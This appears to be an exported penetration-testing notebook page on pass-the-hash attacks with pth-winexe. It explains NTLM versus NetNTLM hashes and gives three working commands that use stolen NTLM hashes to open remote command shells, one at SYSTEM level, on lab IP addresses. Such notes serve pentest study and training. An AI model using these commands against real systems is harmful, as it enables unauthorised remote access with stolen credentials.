<!doctype html>
<html>

<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>pth-winexe (NTLM hash)</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>

<body>
  <div class='page'>
    <h1 class='title'>pth-winexe (NTLM hash)</h1><br /><br /><strong>Prerequisite:</strong><br />• NTLM hash &amp;
    user<br /><br /><strong>Little parethesis</strong><br />“NetNTLM”, are “salted” NTLM hash. (I say salted because
    it’s a little easier to understand, but really it’s a hashed response to a challenge). <br /> <span
      style="color:#ff0000;">NetNTLM hash can not be used with PTH</span>. If we have <a
      href="Home--Penetration_Test_Methodology--Network_Pentest--Sniffing-Spoofing-Poisoning--NetNTLM_attacks.html">recovered
      NetNTLM hash</a>, we can crack it offline or try to capture it again and perform an <a
      href="st_Methodology--Network_Pentest--Sniffing-Spoofing-Poisoning--NetNTLM_attacks--Man-in-the-Middle_techniques_(IPv4)--NTLM-SMB_Relay_attack.html">SMB
      relay attack</a><br />The types of hashes you can use with PTH are NTLM hashes.<br /> To get the NTLM hashes, we
    have to have to exploit a system through some other means and wind up with SYSTEM privs. Then you can dump local SAM
    hashes through Meterpreter, Empire, or some other tool.<br /><br /><strong>PTH-suite</strong><br />To login remotely
    using NTLM hash we can use <strong>pth-winexe</strong>, tool of the suite pth-toolkit(<a
      href="https://github.com/byt3bl33d3r/pth-toolkit" target="_blank">https://github.com/byt3bl33d3r/pth-toolkit</a>)<br /><br /><span
      style="color:#a5452a;">example:</span><br />With the below credentials stolen we can mount the attack (to use
    pwdump program we need be anyway already admin!)<br /><a href=""><img src="images/834-1.png"
        alt="images/834-1.png" /></a>
    <div class="codebox">
      <div class="codebox">
        pth-winexe&nbsp;-U&nbsp;WIN-TL9US2GEKA2/danie%B267DF22CB945E3EAAD3B435B51404EE:F99C08F99EBC65182E969E9021E827F3&nbsp;//192.168.1.118&nbsp;cmd.exe
      </div>
    </div><br /> <a href=""><img src="images/834-2.png" alt="images/834-2.png" /></a><br /><br /><span
      style="color:#a5452a;">example 2: command prompt</span><br />
    <div class="codebox">
      <div class="codebox">
        root@kali:/#&nbsp;pth-winexe&nbsp;-U&nbsp;&#39;admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da&#39;&nbsp;//192.168.147.213&nbsp;cmd.exe
      </div>
    </div><br /> <a href=""><img src="images/834-3.png" alt="images/834-3.png" /></a> <br /><br /><span
      style="color:#a5452a;">example 3: SYSTEM level command prompt</span><br />
    <div class="codebox">
      <div class="codebox">
        root@kali:/#&nbsp;pth-winexe&nbsp;--system&nbsp;-U&nbsp;&#39;admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da&#39;&nbsp;//192.168.147.213&nbsp;cmd.exe
      </div>
    </div> <br /> <a href=""><img src="images/834-4.png" alt="images/834-4.png" /></a><br />
  </div>
</body>

</html>